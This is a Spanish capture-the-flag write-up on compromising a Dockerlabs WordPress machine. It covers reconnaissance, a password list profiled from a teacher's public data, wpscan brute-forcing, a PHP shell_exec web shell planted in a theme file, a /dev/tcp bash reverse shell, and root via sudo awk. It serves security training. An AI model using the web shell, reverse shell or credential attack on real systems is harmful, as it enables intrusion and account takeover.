Desplegamos la máquina vulnerable poniendo en la terminal la línea de comandos **bash auto_deploy.sh escolares.tar** en la carpeta donde se encuentre el contenido extraído del zip.<br>
  <ins>En este caso, la dirección IP de la máquina a vulnerar es la 172.17.0.2</ins>.

  ![image](https://github.com/user-attachments/assets/e0204175-0ab6-40bf-af96-7c1def865cd0)

Ahora, realizamos un escaneo de puertos de la máquina para revisar los puertos abiertos existentes y los posibles servicios a atacar mediante el uso de esos puertos.

  ![image](https://github.com/user-attachments/assets/c92fb834-9deb-4bb4-aa32-5a3abe4c6e46)

Podemos ver que se encuentran abiertos los puertos ***22*** y ***80***, correspondientes a los servicios ***SSH*** y ***HTTP***, respectivamente.

Nos dirigimos al navegador y escribimos la dirección URL http://172.17.0.2:80:

  ![image](https://github.com/user-attachments/assets/8fb83317-6439-4dd1-8e14-97c037f9b898)

Vamos a obtener los subdirectorios existentes en la página web para conseguir visualizar otras páginas que puedan darnos más información. Debido a que revisando el código fuente de la página y mediante el uso del comando ***ffuf*** para realizar fuzzing no detectamos nuevas páginas, vamos a emplear un comando similar llamado ***gobuster***, con el que obtendremos las páginas existentes en distintos formatos. En este caso, vamos a buscar aquellas que tengan extensión .*html*, .*php*, .*py*, .*txt*.

  ![image](https://github.com/user-attachments/assets/55c52aea-0363-4f59-819d-39d35b87b77e)

De los resultados encontrados, nos fijamos en "**/wordpress**", ya que esto significa que la página web se ha realizado con este servicio.

  ![image](https://github.com/user-attachments/assets/0d4a3730-84bd-4df3-8a2e-d28a2b6fc77b)

Vemos que hay una entrada existente creada por el usuario "**luisillo**".

Escribimos en el navegador la ruta http://172.17.0.2/wordpress/wp-admin y se nos muestra el formulario de inicio de sesión a la página de Administración del sitio web:

  ![image](https://github.com/user-attachments/assets/9e14777a-7353-4f12-b9b7-385eb34080e2)

A pesar de contar con el nombre de usuario, necesitamos obtener la contraseña para conseguir acceder, por lo que tendremos que realizar un ataque de fuerza bruta con la finalidad de obtener la clave del usuario "luisillo".

Volviendo a la página de inicio, nos damos cuenta que hay una sección llamada "**Profesores**", en la que se presentan de manera pública los datos personales de algunos de los docentes de la universidad; incluso, se especifica que el administrador del WordPress es el profesor Luis.

  ![image](https://github.com/user-attachments/assets/dca870c0-6587-4105-893d-dd1f2d6feaf5)

Ahora, para obtener la contraseña del usuario utilizaremos la herramienta **CUPP**, la cual no viene por defecto instalada en Kali Linux. CUPP (*Common User Passwords Profiler*) es una herramienta diseñada para generar listas de contraseñas personalizadas basadas en información específica de un usuario objetivo, ya que generalmente los usuarios emplean contraseñas que cuentan con datos personales (nombre, fecha de nacimiento, nombre de su mascota, etc...) en lugar de contraseñas genéricas, a la hora de crear sus cuentas.

Una vez hemos instalado CUPP, escribimos en la terminal **cupp -i** para ejecutarlo en modo interactivo.

  ![image](https://github.com/user-attachments/assets/77ae2455-c770-473e-8b6c-7fb1bb3aa43a)

Después de establecer los datos personales de la víctima, se crea un diccionario personalizado con contraseñas generadas en base a la información obtenida.

Escaneamos las vulnerabilidades del sitio web creado con WordPress usando la línea de código **wpscan --url http://escolares.dl/wordpress/ -U luisillo -P luis.txt**

  ![image](https://github.com/user-attachments/assets/9d72782e-8922-4788-946c-2573b5a69f78)

Podemos ver que la ejecución del comando nos devuelve unas claves válidas para el formulario de Login de WordPress:

  ![image](https://github.com/user-attachments/assets/cfef7120-7393-4830-8da3-10c789cd3435)

La contraseña del usuario "luisillo" es "Luis1981". Probamos las credenciales en el formulario.

  ![image](https://github.com/user-attachments/assets/020b1e5b-6aa0-42e7-b6f3-dc3d0baa9d72)

Estamos dentro del panel de administración del sitio web. Hay que buscar ahora la manera de acceder a la máquina desde el sitio web.

  ![image](https://github.com/user-attachments/assets/1509d6e2-f34b-4440-80ff-37f73bae1d8f)

Abrimos WP File Manager y nos vamos a la ruta **wp-content>themes>twentytwentytwo>index.php** y en ese archivo insertamos el siguiente código:

**&lt;?php echo "&lt;pre&gt;". shell_exec($_REQUEST['cmd']). "&lt;/pre&gt;" ?&gt;**

  ![image](https://github.com/user-attachments/assets/5bf5ecaa-8197-4a8a-b1e4-77ee3dbf7bc8)

En el navegador buscamos la dirección URL http://172.17.0.2/wordpress/wp-content/themes/twentytwentytwo/index.php y seguido del index.php escribimos la cadena de texto "**?cmd=**" para poder ejecutar cualquier comando de consola y ver la salida de este en la página. Esto es lo que se nos muestra al ejecutar el comando whoami:

  ![image](https://github.com/user-attachments/assets/3944ebe6-6065-48f9-8a34-dbd46e71ee76)

Somos el usuario www-data. Sabiendo que podemos ejecutar cualquier comando, vamos a realizar una reverse shell utilizando la página web [https://www.revshells.com/](https://www.revshells.com/).

Nos ponemos en escucha por el puerto 443:

  ![image](https://github.com/user-attachments/assets/e1457987-1cc0-4930-9788-bfa6629494b9)

Una vez tenemos la reverse shell (en mi caso, *bash -c 'bash -i >& /dev/tcp/172.17.0.1/443 0>&1'*) tendremos que descodificarlo para transformarlo en un formato válido para la dirección URL. Para ello usamos el Decoder disponible en Burp Suite y copiamos la cadena generada para ejecutar la reverse shell.

  ![image](https://github.com/user-attachments/assets/ae654792-cd69-466d-8c73-6a5ead1daf2a)

Y una vez ejecutamos esto, la página se queda cargando, por lo que al mirar en nuestra terminal abierta vemos que la reverse shell ha funcionado correctamente:

  ![image](https://github.com/user-attachments/assets/b4f34c07-3794-4d7d-81f7-1589277c13a5)

Realizamos búsquedas dentro de los directorios para encontrar información que nos permita posteriormente escalar privilegios:

  ![image](https://github.com/user-attachments/assets/178c7726-ba74-4b05-b0f2-bbf6e33fcb77)

Nos encontramos con un archivo de texto cuyo contenido es la contraseña del usuario luisillo.

  ![image](https://github.com/user-attachments/assets/3b98c025-a843-4825-800b-08e82ca230d0)

Al ejecutar el comando **sudo -l** para visualizar los archivos binarios que puede ejecutar el usuario luisillo, vemos que este usuario puede ejecutar el binario /usr/bin/awk como usuario root, sin necesidad de ingresar su contraseña.

  ![image](https://github.com/user-attachments/assets/aa6bf254-599d-4809-98d1-9a6c4923abcc)

Miramos en [GTFOBins](https://gtfobins.github.io/) acerca del binario ***/usr/bin/awk***.

  ![image](https://github.com/user-attachments/assets/ca0e29aa-b86c-4088-97a8-2ccb20121bf4)

  ![image](https://github.com/user-attachments/assets/f7a1a4de-3622-4d8a-9c25-59efaf1550cc)

Hemos logrado acceder como el usuario root.

Una vez finalizamos con la máquina de Dockerlabs presionamos **Ctrl+C** para eliminarla.

  ![image](https://github.com/user-attachments/assets/210b25a9-87f2-4329-a9a0-b9cec257d249)
